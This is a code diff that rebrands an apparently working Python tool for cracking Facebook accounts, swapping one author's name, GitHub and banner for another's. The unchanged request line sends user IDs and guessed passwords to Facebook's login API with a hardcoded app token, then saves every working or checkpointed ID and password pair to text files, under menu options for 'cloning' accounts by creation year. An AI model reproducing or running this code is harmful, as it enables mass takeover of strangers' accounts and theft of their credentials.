@@ -390,19 +390,15 @@ def follow(ses,coki):
 logo = ("""\033[1;32m
        
 
-████████╗██╗   ██╗████████╗██╗   ██╗██╗     ╚══██╔══╝██║   ██║╚══██╔══╝██║   ██║██║        ██║   ██║   ██║   ██║   ██║   ██║██║     
-   ██║   ██║   ██║   ██║   ██║   ██║██║     
-   ██║   ╚██████╔╝   ██║   ╚██████╔╝███████╗
-   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝
-                                            \033
+                                            V6
 __________________×______________________
-  Auther   :  Amjed  Alkeesh
+  Auther   :RU Brook Don
  
-  Github   :  Tutul75o
+  Github   :  rubrook1
 
-  Facebook: Tutul Mr.    (50% Ok Account Open Just Now)❤️
+  Facebook: RU Brook    (50% Ok Account Open Just Now)❤️
 
-  WhatsApp: 0944316832
+  Telegram: join telegram
 __________________×______________________\033[1;37m""")
 
 class Main:
@@ -418,8 +414,8 @@ class Main:
 		print(" [3] Create File")
 		print(" [4] 2008-9 Cloning")
 		print(" [5] 2011-14 Cloning")
-		print(" [6] 2004-2005 Cloning Paid")
-		print(" [7] 2006-2007 Cloning Paid")
+		print(" [6] 2004-2005 Cloning")
+		print(" [7] 2006-2007 Cloning")
 		print(" [E] Exit Programming\n")
 		TUTUL =input(" Choose : ")
 		if TUTUL in ["1", "01"]:
@@ -916,15 +912,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ Brook-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-Brook-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ Tutul-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-Tutul-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-Brook-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -949,14 +945,14 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m AHAD Toll Paid You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
+		print(" \033[1;32m  RU Brook Paid Tool You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : Paid Tools  \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+ahsan+key1)
+		print (" Your Key : "+ak+rubrook+key1)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
